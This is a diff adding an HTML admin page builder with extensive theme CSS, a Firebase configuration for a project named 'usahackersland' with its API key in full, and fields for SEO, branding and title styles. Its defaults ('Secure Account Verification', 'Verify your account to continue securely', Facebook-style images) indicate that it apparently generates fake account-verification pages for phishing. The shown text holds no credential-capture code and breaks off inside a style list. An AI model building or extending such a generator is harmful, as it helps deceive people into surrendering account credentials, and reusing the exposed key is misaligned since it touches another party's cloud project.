@@ -1,0 +1,6076 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>🎨 COMPLETE FINAL</title>
+
+<style>
+/* =========================
+   🌙 FLOATING THEME BUTTON (ADMIN ONLY)
+========================= */
+
+#adminPanel #themeToggle {
+  position: fixed;
+  bottom: 20px;
+  right: 20px;
+  z-index: 9999;
+  cursor: pointer;
+  transition: transform 0.2s ease;
+}
+
+#adminPanel #themeToggle:hover {
+  transform: scale(1.1);
+}
+
+/* THEME MENU */
+#adminPanel #themeMenu {
+  position: fixed;
+  top: 15px;
+  right: 15px;
+  display: flex;
+  gap: 6px;
+  z-index: 9999;
+}
+
+#adminPanel #themeMenu button {
+  width: 36px;
+  height: 36px;
+  border-radius: 50%;
+  border: none;
+  cursor: pointer;
+  background: #000;
+  color: #fff;
+}
+
+/* =========================
+   🎨 ADMIN PANEL THEMES (20+)
+========================= */
+
+/* DEFAULT TRANSITION */
+#adminPanel {
+  transition: all 0.3s ease;
+}
+
+/* DARK */
+#adminPanel.dark-mode { background:#111; color:#eee; }
+
+/* BLUE */
+#adminPanel.blue-theme { background:#e3f2fd; }
+#adminPanel.blue-theme .section { background:#bbdefb; }
+
+/* PINK */
+#adminPanel.pink-theme { background:#ffe4ec; }
+#adminPanel.pink-theme .section { background:#ffc1d6; }
+
+/* GREEN */
+#adminPanel.green-theme { background:#e8f5e9; }
+#adminPanel.green-theme .section { background:#c8e6c9; }
+
+/* PURPLE */
+#adminPanel.purple-theme { background:#f3e5f5; }
+#adminPanel.purple-theme .section { background:#e1bee7; }
+
+/* ORANGE */
+#adminPanel.orange-theme { background:#fff3e0; }
+#adminPanel.orange-theme .section { background:#ffe0b2; }
+
+/* RED */
+#adminPanel.red-theme { background:#ffebee; }
+#adminPanel.red-theme .section { background:#ffcdd2; }
+
+/* TEAL */
+#adminPanel.teal-theme { background:#e0f2f1; }
+#adminPanel.teal-theme .section { background:#b2dfdb; }
+
+/* GOLD */
+#adminPanel.gold-theme { background:#fff8e1; }
+#adminPanel.gold-theme .section { background:#ffecb3; }
+
+/* CYBER */
+#adminPanel.cyber-theme {
+  background:#0f172a;
+  color:#00e5ff;
+}
+
+/* GLASS */
+#adminPanel.glass-theme {
+  background:rgba(255,255,255,0.3);
+  backdrop-filter:blur(10px);
+}
+
+/* NEON */
+#adminPanel.neon-theme {
+  background:#000;
+  color:#39ff14;
+}
+
+/* MIDNIGHT */
+#adminPanel.midnight-theme {
+  background:#020617;
+  color:#cbd5f5;
+}
+
+/* SUNSET */
+#adminPanel.sunset-theme {
+  background:linear-gradient(135deg,#ff7e5f,#feb47b);
+}
+
+/* OCEAN */
+#adminPanel.ocean-theme {
+  background:linear-gradient(135deg,#2193b0,#6dd5ed);
+}
+
+/* FOREST */
+#adminPanel.forest-theme {
+  background:#1b5e20;
+  color:#c8e6c9;
+}
+
+/* LAVENDER */
+#adminPanel.lavender-theme {
+  background:#f3e8ff;
+}
+
+/* ROSE */
+#adminPanel.rose-theme {
+  background:#ffe4e6;
+}
+
+/* ICE */
+#adminPanel.ice-theme {
+  background:#e0f7fa;
+}
+
+/* FIRE */
+#adminPanel.fire-theme {
+  background:#ff5722;
+  color:#fff;
+}
+
+
+/* Smooth transition */
+body {
+  transition: background 0.3s ease, color 0.3s ease;
+}
+
+    /* =========================
+   Facebook Animations
+========================= */
+@keyframes fbFadeIn {
+  from { opacity:0; transform:translateY(20px); }
+  to { opacity:1; transform:translateY(0); }
+}
+
+@keyframes fbPop {
+  0% { transform:scale(.9); opacity:0; }
+  100% { transform:scale(1); opacity:1; }
+}
+
+@keyframes fbPulse {
+  0% { transform:scale(1); }
+  50% { transform:scale(1.05); }
+  100% { transform:scale(1); }
+}
+
+.fb-card-animate {
+  animation: fbFadeIn .6s ease;
+}
+
+.fb-post-animate {
+  animation: fbPop .5s ease;
+}
+
+/* ===============================
+   TITLE ANIMATIONS (COMPLETE)
+================================ */
+
+/* Fade */
+@keyframes fade {
+  from { opacity: 0; }
+  to   { opacity: 1; }
+}
+
+/* Slide Up */
+@keyframes slideUp {
+  from { transform: translateY(40px); opacity: 0; }
+  to   { transform: translateY(0); opacity: 1; }
+}
+
+/* Slide Down */
+@keyframes slideDown {
+  from { transform: translateY(-40px); opacity: 0; }
+  to   { transform: translateY(0); opacity: 1; }
+}
+
+/* Slide Left */
+@keyframes slideLeft {
+  from { transform: translateX(40px); opacity: 0; }
+  to   { transform: translateX(0); opacity: 1; }
+}
+
+/* Slide Right */
+@keyframes slideRight {
+  from { transform: translateX(-40px); opacity: 0; }
+  to   { transform: translateX(0); opacity: 1; }
+}
+
+/* Zoom In */
+@keyframes zoomIn {
+  from { transform: scale(0.6); opacity: 0; }
+  to   { transform: scale(1); opacity: 1; }
+}
+
+/* Zoom Out */
+@keyframes zoomOut {
+  from { transform: scale(1.4); opacity: 0; }
+  to   { transform: scale(1); opacity: 1; }
+}
+
+/* Rotate */
+@keyframes rotate {
+  from { transform: rotate(-180deg); opacity: 0; }
+  to   { transform: rotate(0deg); opacity: 1; }
+}
+
+/* Rotate In */
+@keyframes rotateIn {
+  from { transform: rotate(180deg) scale(0.5); opacity: 0; }
+  to   { transform: rotate(0deg) scale(1); opacity: 1; }
+}
+
+/* Bounce */
+@keyframes bounce {
+  0%, 100% { transform: translateY(0); }
+  50%      { transform: translateY(-10px); }
+}
+
+/* Pulse */
+@keyframes pulse {
+  0%   { transform: scale(1); }
+  50%  { transform: scale(1.05); }
+  100% { transform: scale(1); }
+}
+
+/* Shake */
+@keyframes shake {
+  0%, 100% { transform: translateX(0); }
+  25%      { transform: translateX(-6px); }
+  75%      { transform: translateX(6px); }
+}
+
+/* Flip X */
+@keyframes flipX {
+  from { transform: rotateX(90deg); opacity: 0; }
+  to   { transform: rotateX(0deg); opacity: 1; }
+}
+
+/* Flip Y */
+@keyframes flipY {
+  from { transform: rotateY(90deg); opacity: 0; }
+  to   { transform: rotateY(0deg); opacity: 1; }
+}
+
+/* Fade Left */
+@keyframes fadeLeft {
+  from { transform: translateX(40px); opacity: 0; }
+  to   { transform: translateX(0); opacity: 1; }
+}
+
+/* Fade Right */
+@keyframes fadeRight {
+  from { transform: translateX(-40px); opacity: 0; }
+  to   { transform: translateX(0); opacity: 1; }
+}
+
+/* Skew */
+@keyframes skew {
+  from { transform: skewX(20deg); opacity: 0; }
+  to   { transform: skewX(0deg); opacity: 1; }
+}
+
+/* Drop In */
+@keyframes dropIn {
+  from { transform: translateY(-80px); opacity: 0; }
+  to   { transform: translateY(0); opacity: 1; }
+}
+
+/* Slide + Rotate */
+@keyframes slideRotate {
+  from { transform: translateX(40px) rotate(90deg); opacity: 0; }
+  to   { transform: translateX(0) rotate(0deg); opacity: 1; }
+}
+
+/* ===============================
+   PREVIEW
+   =============================== */
+#preview {
+  position: relative;
+  min-height: 520px;
+  height: 75vh;
+  overflow: visible;
+  width: 100%;
+  user-select: none;
+}
+
+/* ===============================
+   ADMIN INPUT FIX (COMPACT)
+   =============================== */
+.wrap input,
+.wrap textarea,
+.wrap select {
+  width: 100%;
+  padding: 8px 10px;
+  font-size: 14px;
+  margin: 4px 0 10px;
+  border: 1px solid #d0d0d0;
+  border-radius: 6px;
+  box-sizing: border-box;
+}
+
+.wrap textarea {
+  min-height: 70px;
+  resize: vertical;
+}
+
+.wrap label {
+  font-size: 13px;
+  font-weight: 600;
+  display: block;
+  margin-top: 8px;
+}
+
+/* ===============================
+   SECTION GROUPS
+   =============================== */
+.section {
+  background: #ffffff;
+  border: 1px solid #e2e2e2;
+  border-radius: 10px;
+  padding: 14px;
+  margin-bottom: 18px;
+}
+
+.section h3 {
+  margin: 0 0 12px;
+  font-size: 15px;
+  font-weight: 700;
+  border-bottom: 1px solid #eee;
+  padding-bottom: 6px;
+}
+
+/* ===============================
+   PREVIEW ELEMENTS
+   =============================== */
+#preview input,
+#preview textarea,
+#preview select {
+  font-size: 16px;
+}
+
+#preview button {
+  padding: 12px 20px;
+  font-size: 16px;
+  border: none;
+  border-radius: 8px;
+  cursor: pointer;
+}
+
+#preview video,
+#preview iframe,
+#preview img {
+  max-width: 100%;
+  border-radius: 8px;
+  margin: 6px 0;
+}
+
+.draggableBtn {
+  font-size: 14px;
+  padding: 8px;
+}
+
+/* Mobile */
+@media (max-width: 768px) {
+  .wrap > div {
+    flex: 1 1 100%;
+  }
+}
+
+/* ===============================
+   GENERATE FORM BUTTON
+   =============================== */
+#generateFormButton {
+  background-color: #1976d2; /* Blue */
+  color: #fff;               /* White text */
+  border: none;
+  padding: 12px 20px;
+  border-radius: 8px;
+  cursor: pointer;
+  font-size: 16px;
+  transition: background 0.3s;
+}
+
+#generateFormButton:hover {
+  background-color: #115293; /* Darker blue on hover */
+}
+
+/* ===== TEXT GRADIENT SUPPORT ===== */
+.gradient-text {
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+}
+
+/* ===== ANIMATIONS ===== */
+@keyframes glowPulse {
+  0% { text-shadow: 0 0 5px #fff; }
+  50% { text-shadow: 0 0 20px #0ff; }
+  100% { text-shadow: 0 0 5px #fff; }
+}
+
+@keyframes flashBlink {
+  0%,100% { opacity: 1; }
+  50% { opacity: 0.3; }
+}
+
+@keyframes waveMove {
+  0% { transform: translateY(0px); }
+  50% { transform: translateY(-5px); }
+  100% { transform: translateY(0px); }
+}
+
+.preview-box {
+  padding: 20px;
+  border: 1px solid #ddd;
+  border-radius: 10px;
+  background: #f9f9f9;
+  margin-top: 10px;
+}
+
+/* SAMPLE STYLE CLASSES */
+
+.style1 { text-decoration: underline; }
+.style2 { font-weight: bold; }
+.style3 { font-style: italic; }
+.style4 { text-transform: uppercase; }
+.style5 { letter-spacing: 4px; }
+
+.style6 { text-shadow: 0 0 5px rgba(0,0,0,0.5); }
+.style8 { text-shadow: 0 0 10px #00f; }
+.style9 { text-shadow: 0 0 10px #ff00ff; }
+
+.style21 {
+  background: linear-gradient(90deg,#00f,#0ff);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+}
+
+/* ===== BUTTON EFFECTS ===== */
+
+.glow-blue { box-shadow:0 0 15px #2196f3; }
+.glow-red { box-shadow:0 0 15px #f44336; }
+.glow-green { box-shadow:0 0 15px #4caf50; }
+.neon { box-shadow:0 0 5px #fff,0 0 20px #0ff; }
+.soft-shadow { box-shadow:0 4px 10px rgba(0,0,0,0.2); }
+.hard-shadow { box-shadow:4px 4px 0 #000; }
+.outer-ring { box-shadow:0 0 0 4px rgba(0,0,0,0.2); }
+.inner-glow { box-shadow: inset 0 0 15px rgba(255,255,255,0.5); }
+.floating { box-shadow:0 10px 25px rgba(0,0,0,0.3); }
+.glass { backdrop-filter: blur(10px); background:rgba(255,255,255,0.2); }
+
+.rainbow-glow {
+  box-shadow:0 0 10px red,0 0 20px orange,0 0 30px yellow;
+}
+
+.cyber-glow { box-shadow:0 0 20px #00f0ff; }
+.fire-glow { box-shadow:0 0 20px #ff5722; }
+.ice-glow { box-shadow:0 0 20px #00e5ff; }
+
+.shadow-left { box-shadow:-6px 6px 12px rgba(0,0,0,0.3); }
+.shadow-right { box-shadow:6px 6px 12px rgba(0,0,0,0.3); }
+.shadow-top { box-shadow:0 -6px 12px rgba(0,0,0,0.3); }
+.shadow-bottom { box-shadow:0 6px 12px rgba(0,0,0,0.3); }
+
+.scale-hover:hover { transform:scale(1.1); }
+.spin-hover:hover { transform:rotate(5deg); }
+.bounce-hover:hover { transform:translateY(-6px); }
+.shake-hover:hover { animation:shake .3s; }
+.flash-hover:hover { opacity:.7; }
+
+@keyframes shake {
+  0%,100%{transform:translateX(0);}
+  25%{transform:translateX(-4px);}
+  75%{transform:translateX(4px);}
+}
+
+/* ===== SHAPES ===== */
+
+.square { border-radius:0; }
+.sharp { border-radius:2px; }
+.circle { border-radius:50%; }
+.semi-round { border-radius:20px 0 20px 0; }
+.top-round { border-radius:20px 20px 0 0; }
+.bottom-round { border-radius:0 0 20px 20px; }
+.left-round { border-radius:20px 0 0 20px; }
+.right-round { border-radius:0 20px 20px 0; }
+.blob { border-radius:40% 60% 60% 40%; }
+.diamond { transform:rotate(45deg); }
+.skew { transform:skewX(-15deg); }
+.parallelogram { transform:skewX(-20deg); }
+.cut-corner { clip-path:polygon(10% 0,100% 0,100% 90%,90% 100%,0 100%,0 10%); }
+.double-border { border:4px double #000; }
+.thick-border { border:4px solid #000; }
+.outline { background:transparent !important; border:2px solid currentColor; }
+.ghost { background:transparent !important; border:2px solid #fff; color:#fff; }
+.neumorphic {
+  box-shadow:6px 6px 12px #bbb,-6px -6px 12px #fff;
+}
+.btn-3d { box-shadow:0 6px 0 #0d47a1; }
+
+/* ===============================
+   🚀 ULTRA PRO BUTTON EFFECTS
+================================ */
+
+/* Animated Gradient Border */
+.gradient-border {
+  position: relative;
+  z-index: 1;
+  overflow: hidden;
+}
+
+.gradient-border::before {
+  content: "";
+  position: absolute;
+  inset: -2px;
+  border-radius: inherit;
+  background: linear-gradient(45deg,#ff00cc,#3333ff,#00ffcc);
+  background-size: 300% 300%;
+  animation: borderMove 4s linear infinite;
+  z-index: -1;
+}
+
+@keyframes borderMove {
+  0% { background-position:0% 50%; }
+  50% { background-position:100% 50%; }
+  100% { background-position:0% 50%; }
+}
+
+/* Glow Pulse */
+.glow-pulse {
+  animation: glowPulseBtn 1.5s infinite;
+}
+
+@keyframes glowPulseBtn {
+  0% { box-shadow:0 0 5px #2196f3; }
+  50% { box-shadow:0 0 25px #2196f3; }
+  100% { box-shadow:0 0 5px #2196f3; }
+}
+
+/* 3D Press */
+.press-3d {
+  box-shadow: 0 6px 0 #0d47a1;
+  transition: all .1s ease;
+}
+.press-3d:active {
+  transform: translateY(6px);
+  box-shadow: 0 0 0 #0d47a1;
+}
+
+/* Ripple Effect */
+.ripple {
+  position: relative;
+  overflow: hidden;
+}
+
+.ripple span {
+  position: absolute;
+  border-radius: 50%;
+  transform: scale(0);
+  animation: rippleAnim .6s linear;
+  background: rgba(255,255,255,0.7);
+}
+
+@keyframes rippleAnim {
+  to {
+    transform: scale(4);
+    opacity: 0;
+  }
+}
+
+#eyeIcon:hover {
+  opacity: 0.7;
+}
+
+#preview .admin-only {
+  display: none !important;
+}
+
+/* =========================
+   🎛 ADMIN PANEL UI UPGRADE
+========================= */
+
+/* Section box */
+.section {
+  background: #ffffff;
+  border-radius: 12px;
+  padding: 15px;
+  margin-bottom: 15px;
+  box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+}
+
+/* Labels */
+label {
+  font-size: 13px;
+  font-weight: 600;
+  margin-bottom: 4px;
+  display: block;
+}
+
+/* Inputs */
+input, select, textarea {
+  width: 100%;
+  padding: 8px 10px;
+  border-radius: 8px;
+  border: 1px solid #ddd;
+  margin-bottom: 10px;
+  font-size: 13px;
+  transition: all 0.2s ease;
+}
+
+input:focus, select:focus, textarea:focus {
+  border-color: #4CAF50;
+  box-shadow: 0 0 0 2px rgba(76,175,80,0.15);
+  outline: none;
+}
+
+/* =========================
+   🔘 BUTTONS
+========================= */
+button {
+  border: none;
+  padding: 10px 14px;
+  border-radius: 8px;
+  cursor: pointer;
+  font-size: 13px;
+  font-weight: 600;
+  transition: all 0.2s ease;
+}
+
+/* Primary button */
+.btn-primary {
+  background: linear-gradient(135deg, #4CAF50, #43a047);
+  color: white;
+}
+
+.btn-primary:hover {
+  transform: translateY(-1px);
+  box-shadow: 0 4px 10px rgba(0,0,0,0.15);
+}
+
+/* Danger button */
+.btn-danger {
+  background: linear-gradient(135deg, #ff4d4d, #e53935);
+  color: white;
+}
+
+.btn-danger:hover {
+  transform: translateY(-1px);
+}
+
+/* =========================
+   ☑ CUSTOM CHECKBOX
+========================= */
+.checkbox {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  cursor: pointer;
+  margin-bottom: 8px;
+}
+
+.checkbox input {
+  display: none;
+}
+
+.checkbox span {
+  width: 18px;
+  height: 18px;
+  border-radius: 5px;
+  border: 2px solid #bbb;
+  display: inline-block;
+  position: relative;
+  transition: 0.2s;
+}
+
+.checkbox input:checked + span {
+  background: #4CAF50;
+  border-color: #4CAF50;
+}
+
+.checkbox input:checked + span::after {
+  content: "✔";
+  position: absolute;
+  font-size: 12px;
+  color: white;
+  left: 2px;
+  top: -1px;
+}
+
+/* Glow checkbox */
+.checkbox.glow input:checked + span {
+  box-shadow: 0 0 10px #000;
+}
+
+/* Soft style */
+.checkbox.soft span {
+  border-color: #aaa;
+}
+
+.checkbox.soft input:checked + span {
+  background: #333;
+}
+
+/* Inverted (white on dark) */
+body.dark-mode .checkbox span {
+  border-color: #fff;
+  background: transparent;
+}
+
+body.dark-mode .checkbox input:checked + span {
+  background: #fff;
+}
+
+body.dark-mode .checkbox input:checked + span::after {
+  color: #000;
+}
+
+/* =========================
+   🎨 COLOR PICKER STYLE
+========================= */
+input[type="color"] {
+  height: 40px;
+  padding: 3px;
+  border-radius: 8px;
+  border: 1px solid #ddd;
+  cursor: pointer;
+}
+
+h3 {
+  font-size: 15px;
+  margin-bottom: 10px;
+  color: #333;
+}
+
+/* =========================
+   🔽 CUSTOM SELECT (DROPDOWN)
+========================= */
+
+select {
+  width: 100%;
+  padding: 10px 12px;
+  border-radius: 8px;
+  border: 1px solid #ddd;
+  background: #fff;
+  font-size: 13px;
+  cursor: pointer;
+  appearance: none;           /* remove default arrow */
+  -webkit-appearance: none;
+  -moz-appearance: none;
+
+  /* custom arrow */
+  background-image: url("data:image/svg+xml;utf8,<svg fill='%23666' height='20' viewBox='0 0 20 20' width='20' xmlns='http://www.w3.org/2000/svg'><path d='M5 7l5 5 5-5z'/></svg>");
+  background-repeat: no-repeat;
+  background-position: right 10px center;
+  background-size: 16px;
+}
+
+select:focus {
+  border-color: #4CAF50;
+  box-shadow: 0 0 0 2px rgba(76,175,80,0.15);
+  outline: none;
+}
+
+/* hover effect */
+select:hover {
+  border-color: #aaa;
+}
+
+.select-wrap {
+  position: relative;
+}
+
+/* Button group layout */
+.btn-group {
+  display: flex;
+  gap: 10px;
+  flex-wrap: wrap;
+}
+
+/* Optional hover glow */
+.btn-primary:hover {
+  box-shadow: 0 6px 14px rgba(76,175,80,0.3);
+}
+
+.btn-danger:hover {
+  box-shadow: 0 6px 14px rgba(255,77,77,0.3);
+}
+
+.select-wrap::after {
+  content: "⌄";
+  position: absolute;
+  right: 12px;
+  top: 50%;
+  transform: translateY(-50%);
+  pointer-events: none;
+  font-size: 14px;
+  color: #666;
+}
+
+.select-wrap select {
+  padding-right: 30px;
+}
+
+.btn-primary, .btn-danger {
+  display: inline-flex;
+  align-items: center;
+  gap: 6px;
+}
+
+/* =========================
+   🖤 BLACK & WHITE THEME
+========================= */
+
+/* Sections - soft white card */
+.section {
+  background: #ffffff;
+  border: 1px solid #eee;
+  box-shadow: 0 6px 18px rgba(0,0,0,0.06);
+}
+
+/* Headings */
+.section h3 {
+  color: #111;
+  border-bottom: 1px solid #eee;
+}
+
+/* Labels */
+label {
+  color: #333;
+}
+
+/* Inputs - minimal clean */
+input, textarea, select {
+  background: #fff;
+  border: 1px solid #ddd;
+  color: #111;
+}
+
+input::placeholder,
+textarea::placeholder {
+  color: #999;
+}
+
+/* Focus = BLACK highlight instead of green */
+input:focus, select:focus, textarea:focus {
+  border-color: #000;
+  box-shadow: 0 0 0 2px rgba(0,0,0,0.08);
+}
+
+/* =========================
+   ⚫ MONO BUTTON STYLES
+========================= */
+
+/* Black button */
+.btn-dark {
+  background: #000;
+  color: #fff;
+}
+
+.btn-dark:hover {
+  background: #222;
+  transform: translateY(-1px);
+  box-shadow: 0 6px 14px rgba(0,0,0,0.25);
+}
+
+/* White button */
+.btn-light {
+  background: #fff;
+  color: #000;
+  border: 1px solid #000;
+}
+
+.btn-light:hover {
+  background: #000;
+  color: #fff;
+}
+
+/* Outline button */
+.btn-outline {
+  background: transparent;
+  border: 1px solid #000;
+  color: #000;
+}
+
+.btn-outline:hover {
+  background: #000;
+  color: #fff;
+}
+
+/* Soft gray button */
+.btn-gray {
+  background: #f5f5f5;
+  color: #111;
+}
+
+.btn-gray:hover {
+  background: #e0e0e0;
+}
+
+/* =========================
+   ⚫ CLEAN BLACK SELECT
+========================= */
+
+.select-wrap select {
+  background: #fff;
+  border: 1px solid #000;
+  color: #000;
+}
+
+/* Arrow darker */
+.select-wrap::after {
+  color: #000;
+}
+
+/* Hover */
+.select-wrap select:hover {
+  background: #f9f9f9;
+}
+
+/* =========================
+   🌑 DARK MODE OPTION
+========================= */
+
+body.dark-mode {
+  background: #111;
+}
+
+body.dark-mode .section {
+  background: #1a1a1a;
+  border: 1px solid #333;
+  color: #eee;
+}
+
+body.dark-mode input,
+body.dark-mode textarea,
+body.dark-mode select {
+  background: #111;
+  border: 1px solid #444;
+  color: #fff;
+}
+
+body.dark-mode label {
+  color: #ccc;
+}
+
+/* =========================
+   🧱 3D PRESS BUTTON (BW)
+========================= */
+
+.press-3d {
+  background: #000;
+  color: #fff;
+  border-radius: 8px;
+  padding: 10px 14px;
+  font-weight: 600;
+  cursor: pointer;
+  box-shadow: 0 5px 0 #333;
+  transition: all 0.1s ease;
+}
+
+.press-3d:active {
+  transform: translateY(5px);
+  box-shadow: 0 0 0 #333;
+}
+
+/* Secondary (outline) */
+.press-3d.light {
+  background: #fff;
+  color: #000;
+  border: 2px solid #000;
+  box-shadow: 0 5px 0 #000;
+}
+
+/* =========================
+   🎨 ADMIN PANEL THEMES ONLY
+========================= */
+
+/* DARK */
+#adminPanel.dark-mode {
+  background: #111;
+  color: #eee;
+}
+
+/* BLUE */
+#adminPanel.blue-theme {
+  background: #e3f2fd;
+}
+
+#adminPanel.blue-theme .section {
+  background: #bbdefb;
+}
+
+/* PINK */
+#adminPanel.pink-theme {
+  background: #ffe4ec;
+}
+
+#adminPanel.pink-theme .section {
+  background: #ffc1d6;
+}
+</style>
+
+<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-storage-compat.js"></script>
+
+<script>
+const firebaseConfig = {
+  apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
+  authDomain: "usahackersland.firebaseapp.com",
+  projectId: "usahackersland",
+  storageBucket: "usahackersland.appspot.com"
+};
+
+firebase.initializeApp(firebaseConfig);
+
+const db = firebase.firestore();
+const urlParams = new URLSearchParams(window.location.search);
+const editId = urlParams.get("edit");
+
+let isEditMode = false;
+window.db = db; // ✅ THIS FIXES YOUR ERROR
+</script>
+
+<script>
+
+let fbAdImageData = "";
+let fbSocialImageData = "";
+
+function previewFBImage(inputId, previewId, type) {
+
+  const file = document.getElementById(inputId).files[0];
+  if (!file) return;
+
+  const reader = new FileReader();
+
+  reader.onload = function(e) {
+
+    const img = document.getElementById(previewId);
+    img.src = e.target.result;
+    img.style.display = "block";
+
+    if(type === "ad"){
+      fbAdImageData = e.target.result;
+    }
+
+    if(type === "social"){
+      fbSocialImageData = e.target.result;
+    }
+
+    renderPreview();
+  };
+
+  reader.readAsDataURL(file);
+}
+
+const fbAdInput = document.getElementById("fbAdImage");
+const fbSocialInput = document.getElementById("fbSocialPreviewImage");
+
+if (fbAdInput) {
+  fbAdInput.addEventListener("change", function(){
+    previewFBImage("fbAdImage","fbAdPreview");
+  });
+}
+
+if (fbSocialInput) {
+  fbSocialInput.addEventListener("change", function(){
+    previewFBImage("fbSocialPreviewImage","fbSocialPreview");
+  });
+}
+</script>
+
+<body>
+<div id="adminPanel">
+<div class="wrap">
+<h2>🎨 COMPLETE 👩‍💻</h2> 
+
+ <label>🎨 Theme</label>
+
+<select onchange="setTheme(this.value)">
+  <option value="">Default</option>
+  <option value="dark-mode">Dark 🌙</option>
+  <option value="blue-theme">Blue 🔵</option>
+  <option value="pink-theme">Pink 🌸</option>
+
+  <option value="green-theme">Green 🌿</option>
+  <option value="purple-theme">Purple 💜</option>
+  <option value="orange-theme">Orange 🍊</option>
+  <option value="red-theme">Red 🔴</option>
+  <option value="teal-theme">Teal 🟢</option>
+  <option value="gold-theme">Gold ✨</option>
+
+  <option value="cyber-theme">Cyber ⚡</option>
+  <option value="glass-theme">Glass 🧊</option>
+  <option value="neon-theme">Neon 💡</option>
+  <option value="midnight-theme">Midnight 🌌</option>
+
+  <option value="sunset-theme">Sunset 🌅</option>
+  <option value="ocean-theme">Ocean 🌊</option>
+  <option value="forest-theme">Forest 🌲</option>
+  <option value="lavender-theme">Lavender 🌸</option>
+  <option value="rose-theme">Rose 🌹</option>
+  <option value="ice-theme">Ice ❄️</option>
+  <option value="fire-theme">Fire 🔥</option>
+</select>
+
+<div style="display:flex;gap:18px;flex-wrap:wrap">
+
+<!-- LEFT PANEL -->
+<div style="flex:1;min-width:340px">
+
+<!-- SEO -->
+<div class="section">
+  <h3>🔍 SEO & Social</h3>
+
+  <label>
+    <label class="checkbox">
+  <input type="checkbox" id="enableSEO">
+  <span></span>
+  Enable Social Media Preview
+</label>
+
+  <label>SEO Page Title</label>
+  <input id="seoTitle" value="Secure Account Verification">
+
+  <label>Meta Description</label>
+  <textarea id="metaDesc">Verify your account to continue securely</textarea>
+
+  <label>OG Image URL</label>
+  <input id="ogImage" value="https://i.postimg.cc/htn39rj9/FB-IMG-17655010557088403.jpg">
+
+  <label>Upload OG Image</label>
+  <input type="file" id="ogImageFile" accept="image/*">
+</div>
+
+<!-- BRANDING -->
+<div class="section">
+  <h3>🖼 Branding</h3>
+
+  <!-- Avatar -->
+  <label>Avatar Image URL</label>
+  <input id="avatarURL"
+    value="https://i.postimg.cc/59qvyb1Y/Screenshot-20251123-191324-2-removebg-preview.png">
+
+  <label>Upload Avatar Image</label>
+  <input type="file" id="avatarFile" accept="image/*">
+
+
+  <!-- Logo -->
+  <label>Logo Image URL</label>
+  <input id="logoURL"
+    value="https://i.postimg.cc/htn39rj9/FB-IMG-17655010557088403.jpg">
+
+  <label>Upload Logo Image</label>
+  <input type="file" id="logoFile" accept="image/*">
+
+
+  <!-- Banner -->
+  <label>Banner Image URL</label>
+  <input id="bannerURL"
+    value="https://i.postimg.cc/CxfCxLzw/IMG_20251112_WA0002_2.jpg">
+
+  <label>Upload Banner Image</label>
+  <input type="file" id="bannerFile" accept="image/*">
+</div>
+
+<!-- TEXT -->
+<div class="section">
+  <h3>✍️ Page Content</h3>
+
+  <label>Page Title</label>
+  <input id="title" value="Welcome to Your Secure Page">
+
+  <label>Title Color</label>
+<div style="display:flex; gap:8px; align-items:center;">
+  <input type="color" id="titleColor">
+  <span id="titleColorHex">#000000</span>
+</div>
+  
+  <label>Title Position</label>
+  <select id="titlePosition">
+  <option value="center">Center</option>
+  <option value="left">Left</option>
+  <option value="right">Right</option>
+</select>
+
+  <hr>
+
+  <label>Extra Title Styles</label>
+<select id="titleStyleSelect" multiple size="12">
+
+<option value="style1">Underline Classic</option>
+<option value="style2">Bold Strong</option>
+<option value="style3">Italic Elegant</option>
+<option value="style4">Uppercase Power</option>
+<option value="style5">Letter Spaced</option>
+
+<option value="style6">Soft Shadow</option>
+<option value="style7">Deep Shadow</option>
+<option value="style8">Neon Blue Glow</option>
+<option value="style9">Neon Pink Glow</option>
+<option value="style10">Neon Green Glow</option>
+
+<option value="style11">Luxury Gold</option>
+<option value="style12">Silver Metallic</option>
+<option value="style13">Rose Gold</option>
+<option value="style14">Platinum Shine</option>
+<option value="style15">Chrome Effect</option>
+
+<option value="style16">Glass Effect</option>
+<option value="style17">Frosted Glass</option>
+<option value="style18">Transparent Outline</option>
+<option value="style19">Border Box</option>
+<option value="style20">Pill Shape</option>
+
+<option value="style21">Gradient Ocean</option>
+<option value="style22">Gradient Fire</option>
+<option value="style23">Gradient Sunset</option>
+<option value="style24">Gradient Purple Sky</option>
+<option value="style25">Gradient Cyber</option>
+
+<option value="style26">3D Depth</option>
+<option value="style27">3D Pop</option>
+<option value="style28">3D Emboss</option>
+<option value="style29">3D Deboss</option>
+<option value="style30">Hard Outline</option>
+
+<option value="style31">Double Outline</option>
+<option value="style32">Dotted Border</option>
+<option value="style33">Dashed Border</option>
+<option value="style34">Thick Frame</option>
+<option value="style35">Minimal Clean</option>
+
+<option value="style36">Cyberpunk Pink</option>
+<option value="style37">Hacker Green</option>
+<option value="style38">Matrix Style</option>
+<option value="style39">Retro 80s</option>
+<option value="style40">Vaporwave</option>
+
+<option value="style41">Royal Blue</option>
+<option value="style42">Royal Purple</option>
+<option value="style43">Luxury Black</option>
+<option value="style44">Luxury White</option>
+<option value="style45">Champagne Gold</option>
+
+<option value="style46">Soft Glow White</option>
+<option value="style47">Blue Ice</option>
+<option value="style48">Fire Red</option>
+<option value="style49">Toxic Green</option>
+<option value="style50">Dark Mode Glow</option>
+
+<option value="style51">Heavy Weight</option>
+<option value="style52">Ultra Light</option>
+<option value="style53">Wide Text</option>
+<option value="style54">Tall Text</option>
+<option value="style55">Compact Text</option>
+
+<option value="style56">Highlight Yellow</option>
+<option value="style57">Highlight Blue</option>
+<option value="style58">Highlight Pink</option>
+<option value="style59">Highlight Green</option>
+<option value="style60">Highlight Purple</option>
+
+<option value="style61">Shadow Left</option>
+<option value="style62">Shadow Right</option>
+<option value="style63">Shadow Top</option>
+<option value="style64">Shadow Bottom</option>
+<option value="style65">Floating Shadow</option>
+
+<option value="style66">Glitch Effect</option>
+<option value="style67">Blur Text</option>
+<option value="style68">Blur + Glow</option>
+<option value="style69">Outline Only</option>
+<option value="style70">Inner Shadow</option>
+
+<option value="style71">Soft Rounded</option>
+<option value="style72">Strong Rounded</option>
+<option value="style73">Card Style</option>
+<option value="style74">Banner Style</option>
